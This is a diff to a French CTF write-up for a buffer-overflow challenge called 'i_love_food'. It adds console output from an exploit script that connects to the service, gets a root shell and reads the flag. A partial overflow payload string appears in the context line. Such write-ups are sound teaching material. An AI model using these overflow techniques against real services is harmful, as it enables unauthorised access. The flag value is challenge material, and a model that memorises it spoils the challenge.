@@ -157,4 +157,15 @@ Le programme lance bien /bin/sh, le payload final est donc `"\x41"*44+"\x0d\xf0\
 
 ## Exploit
 
-Il faut maintenant se connecter au service et envoyer le payload. On utilise donc [ce script python](./exploit.py) qui permet de ce connecter au serveur, envoyer le payload, puis d'interagir avec le shell pour obtenir le flag.
+Il faut maintenant se connecter au service et envoyer le payload. On utilise donc [ce script python](./exploit.py) qui permet de ce connecter au serveur, envoyer le payload, puis d'interagir avec le shell pour obtenir le flag :
+
+```console
+$ python3 exploit.py                                                                              
+b"What is your favorite dish ? \nDamn that's a good one !\n"
+whoami
+b'root\n'
+ls
+b'flag.txt\ni_love_food\ni_love_food.c\n'
+cat flag.txt
+b'FLAG{I_JU5T_L1K3_F00D!!}\n'
+```
